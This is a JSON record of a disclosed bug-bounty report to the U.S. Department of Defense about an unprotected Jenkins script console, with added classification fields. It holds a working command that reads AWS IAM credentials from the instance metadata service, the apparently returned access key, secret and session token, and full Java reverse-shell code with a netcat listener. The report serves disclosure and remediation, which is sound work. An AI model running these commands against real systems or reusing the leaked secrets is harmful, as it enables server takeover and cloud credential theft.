{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "shuvam321 ",
    "title": " Remote Code Execution and AWS IAM Credentials Exfiltration in https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/",
    "content": "\nDescription:\nThe host https://\u2588\u2588\u2588\u2588\u2588\u2588/ has /jenkins/script directory enabled that allows user to execute system command in the host.\nReferences\nhttps://hackerone.com/reports/768266\nImpact\nAttacker can use the IAM credentials to manage various AWS resources, create and delete resources, read and write data in AWS services, create and manage other IAM users and roles, access the AWS Management Console, use the AWS Command Line Interface (CLI). In addition, attacker can obtain a reverse shell and takeover the vulnerable server.\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nSteps to Reproduce\nGo to https://\u2588\u2588\u2588/jenkins/script and enter the following command and click on run.\nprintln \"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup\".execute().text\nCode 1.18 KiB\n1{\n2  \"Code\" : \"Success\",\n3  \"LastUpdated\" : \"2023-07-25T15:06:03Z\",\n4  \"Type\" : \"AWS-HMAC\",\n5  \"AccessKeyId\" : \"ASIAVAYADSOPOZ46OKUF\",\n6  \"SecretAccessKey\" : \"zktjDluq7fiPeRPZ/Ptdj0f/RpifcpiverrHZPY9\",\n7  \"Token\" : \"FwoDYXdzEC4aDOSTrvC1+12bsyz/YCLpBJSWuycc/qloo+gbOS0H0HDHj+qAV6rldadbawPMkpUC2kyF9UW3rayH29j3MQNMDDxoPZTpnWLYuIbBl1iaYciwrOVemd6OTSDTyoAz9JjO1Cc3svhv58rhTx1c+FWpQKxtOgiLPEJWT/sPfdEJDAcLoXfyDi7lLWD5ydyHuKWngG8ZBG/5Ik170XOpYeZpSpJ/pspBNnzbf5dPJo/QVNWN+hoY8+WrK4Hko7y04Z/ZwJWO3Q6DYVM2OSARheKUnih8NrX6pROliySxRzj3fedhz2h95axbt+up+HwvszZv+ksQmZdAOFL4iI8oXWF6RgWz7Mkyot+o+Zk4fKRBZOad0iDg0NjaNvZSOWHCx+Bd55lq/rMmthcYubHgGtLXS8F9cJShYjysU9pDK9M7Hd644KmSVgvRe0pCV4GgwOAqKdSYVQn7A2cBeO4ROL712adCz8wzYDMRavHK8mfeKCd5qAfrd7z7BGIiaIeEYJ52CglOpUFywMnlmPNN1V/Rvih1YX0Ndq0yNso9Rj1FUtiLTWysCkm/YGCK68TILlEX7UaJV3keGpMkpCULsGkcH23RZmp8NjYoIf7okJ28ygVW4GYWF48MWVm96HWDRGJ951x3IOIZBdOhgKrVRQJLUXgVjDwm1QroAyYTRSiLw9YrR5jmN6ONfYnyh06qpl1PUz8C1+iXtRQIjzWjaaHLh2YQERTIo/ejCERtoM/AEjhB6DhdlroSvuPNjD03NPYtxd87vUuG7gsZSYqXOOsU3sYiJra3UrbA9vFR/BmnJcXbxcsWMtCCs9syRp9r+2V3qT6ppN2i5Im9KI/K/6UGMkHbC2LUgZo1VIbWCrN+ePxqijy1CUe9r98gOm9Z2rxKQ+CfKjPJo0nvYc3Z8UmxqKpeG2dtOpW8OYuQZivCMR5ifg==\",\n8  \"Expiration\" : \"2023-07-25T21:32:22Z\"\n9}\nIAM Credentials will be disclosed.\nTo get a reverse shell use this command.\nIn vulnerable host\nCode 561 Bytes\n1String host=\"your_server_ip\";\n2int port=1337;\n3String cmd=\"bash\";\n4Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\nIn your host\nCode 13 Bytes\n1nc -nvlp 1337\nYou will receive a reverse shell as user jenkins.\n\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nRestrict access to /jenkins/script directory.\n\n",
    "severity": [
        9.0,
        10.0
    ],
    "bounty": null,
    "weaknesses": [
        "Command Injection - Generic"
    ],
    "screenshots": {},
    "disclosed_date": 1734569580,
    "report_url": "https://hackerone.com/reports/2083771",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to https://\u2588\u2588\u2588\u2588\u2588/jenkins/script"
        ],
        [
            2,
            "Enter the command `println \"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup\".execute().text` and click 'Run' to retrieve AWS IAM credentials."
        ],
        [
            3,
            "For reverse shell, execute the provided Java code snippet in the script console after setting up a listener with `nc -nvlp 1337` on your server."
        ]
    ],
    "vuln_description": "The vulnerability allows remote code execution via an unprotected Jenkins script console endpoint (/jenkins/script), enabling attackers to execute system commands, retrieve AWS IAM credentials from the instance metadata service, and gain full control of the server through reverse shells.",
    "reason": "While the attack involves multiple components (Jenkins script console, AWS metadata service, reverse shell setup), each step is straightforward and well-documented in security research. The vulnerability follows common patterns seen in cloud environment misconfigurations.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": "768266",
    "injection_metadata": {
        "is_simple_payload": false
    },
    "authnz_metadata": {
        "reason": "The vulnerability involves executing system commands via an exposed Jenkins script console, which is a server-side issue unrelated to the authentication or authorization boundaries between users or resources within the same application. The methodology described focuses on testing authorization boundaries between users and resources within the same application context, not server-side command execution vulnerabilities.",
        "is_detectable": false
    }
}